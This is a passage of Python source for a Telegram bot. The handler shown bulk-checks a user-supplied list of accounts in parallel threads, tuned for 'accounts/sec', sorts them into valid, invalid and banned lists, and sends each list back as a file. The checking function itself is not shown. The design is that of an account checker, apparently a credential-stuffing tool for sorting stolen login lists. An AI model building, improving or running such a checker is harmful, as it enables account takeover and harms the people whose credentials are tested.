        # Ultra-fast processing with aggressive timeout
        with ThreadPoolExecutor(max_workers=optimal_threads, thread_name_prefix="UltraFastChecker") as executor:
            all_futures = [executor.submit(check_account_ultra_fast, account) for account in accounts]

            from concurrent.futures import as_completed
            completed = 0
            last_update_time = start_time

            # Much shorter timeout for faster processing
            timeout_per_account = 4 if len(accounts) <= 50 else 3
            total_timeout = max(30, len(accounts) * timeout_per_account)

            try:
                for future in as_completed(all_futures, timeout=total_timeout):
                    try:
                        future.result(timeout=2)  # Very short per-account timeout
                        completed += 1

                        # Update every 10 accounts or every 5 seconds
                        current_time = time.time()
                        if (completed % 10 == 0) or (current_time - last_update_time >= 5) or (completed == len(accounts)):
                            last_update_time = current_time
                            elapsed = current_time - start_time

                            with results_lock:
                                progress_msg = (
                                    f"⚡ **Ultra-Fast Progress: {processed}/{len(accounts)} ({processed/len(accounts)*100:.1f}%)**\n\n"
                                    f"🟢 Valid: {len(valid_accounts)}\n"
                                    f"🔴 Invalid: {len(invalid_accounts)}\n"
                                    f"🟡 Banned: {len(banned_accounts)}\n"
                                    f"⏱️ Elapsed: {elapsed:.1f}s\n"
                                    f"🚀 Speed: {processed/elapsed:.1f} accounts/sec"
                                )

                            try:
                                await context.bot.edit_message_text(
                                    chat_id=update.effective_chat.id,
                                    message_id=start_msg.message_id,
                                    text=progress_msg,
                                    parse_mode='Markdown'
                                )
                            except:
                                pass

                    except Exception:
                        completed += 1
                        with results_lock:
                            processed += 1

            except Exception:
                # Handle timeout - cancel remaining futures
                remaining_futures = [f for f in all_futures if not f.done()]
                for future in remaining_futures:
                    future.cancel()

                with results_lock:
                    processed += len(remaining_futures)

        # Generate and send results
        processing_time = time.time() - start_time
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        user_prefix = f"user_{user_id}_{timestamp}"

        files_to_send = []

        if valid_accounts:
            valid_content = "\n".join(valid_accounts)
            valid_file = io.BytesIO(valid_content.encode('utf-8'))
            valid_file.name = f"{user_prefix}_valid.txt"
            files_to_send.append(("Valid", valid_file, len(valid_accounts)))

        if invalid_accounts:
            invalid_content = "\n".join(invalid_accounts)
            invalid_file = io.BytesIO(invalid_content.encode('utf-8'))
            invalid_file.name = f"{user_prefix}_invalid.txt"
            files_to_send.append(("Invalid", invalid_file, len(invalid_accounts)))

        if banned_accounts:
            banned_content = "\n".join(banned_accounts)
            banned_file = io.BytesIO(banned_content.encode('utf-8'))
            banned_file.name = f"{user_prefix}_banned.txt"
            files_to_send.append(("Banned", banned_file, len(banned_accounts)))

        # Send completion summary
        success_rate = (len(valid_accounts) / len(accounts)) * 100 if accounts else 0
        speed = len(accounts) / processing_time if processing_time > 0 else 0

        summary_msg = (
            f"✅ **Ultra-Fast Processing Complete!**\n\n"
            f"📊 **Results Summary:**\n"
            f"🟢 Valid: {len(valid_accounts)}\n"
            f"🔴 Invalid: {len(invalid_accounts)}\n"
            f"🟡 Banned: {len(banned_accounts)}\n"
            f"📈 Total: {len(accounts)}\n"
            f"📊 Success Rate: {success_rate:.1f}%\n"
            f"⚡ Processing Speed: {speed:.1f} accounts/sec\n"
            f"⏱️ Total Time: {processing_time:.1f}s\n\n"
            f"📁 Sending result files..."
        )

        await update.message.reply_text(summary_msg, parse_mode='Markdown')

        # Send result files
        for file_type, file_obj, count in files_to_send:
            try:
                file_obj.seek(0)
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=file_obj,
                    caption=f"📁 {file_type} accounts: {count} found",
                    filename=file_obj.name
                )
            except Exception as e:
                logger.error(f"Error sending {file_type} file: {e}")

        if not files_to_send:
            await update.message.reply_text("ℹ️ No results to send - all accounts failed processing.")

    

def main():
    """Main function to start the bot."""
    try:
        # Validate configuration
        config_errors = BotConfig.validate_config()
        if config_errors:
            logger.error("Configuration errors:")
            for error in config_errors:
                logger.error(f"  - {error}")
            return

        logger.info("Configuration validated successfully")
        logger.info(f"Admin IDs: {BotConfig.ADMIN_IDS}")

        # Initialize and start the bot
        bot = TelegramBot(BotConfig.BOT_TOKEN, BotConfig.ADMIN_IDS)
        logger.info("Starting Telegram bot...")
        asyncio.run(bot.start())

    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    except Exception as e:
        logger.error(f"Error starting bot: {e}")

if __name__ == "__main__":
    main()
